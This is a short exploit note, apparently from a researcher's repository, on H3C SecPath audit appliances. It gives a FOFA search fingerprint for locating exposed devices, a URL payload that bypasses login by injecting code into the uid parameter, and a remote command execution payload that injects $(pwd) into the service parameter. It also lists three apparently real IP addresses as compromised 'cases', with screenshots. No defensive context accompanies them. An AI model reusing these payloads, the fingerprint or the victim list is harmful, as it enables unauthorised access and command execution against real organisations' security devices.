# H3C SecParh any user login + RCE

FOFA：

```
fid="0w8IgcaFysjYNRi1+ryGpw=="
```



Any user login POC：

```
/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
```



RCE POC：

```
/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(pwd)&identity_cond=&query_type=all&format=json&browse=true
```



Case1：https://222.222.227.17:8888/

Any user login：

![image-20240308210826075](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240308210826075.png)

RCE：

![image-20240308210955564](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240308210955564.png)



Case2：https://60.6.239.18:10018/

Any user login：

![image-20240308211228547](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240308211228547.png)

RCE：

![image-20240308211306937](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240308211306937.png)





Case3：https://110.16.72.190:20443/

Any user login：

![image-20240308211354483](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240308211354483.png)

RCE：

![image-20240308211447078](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240308211447078.png)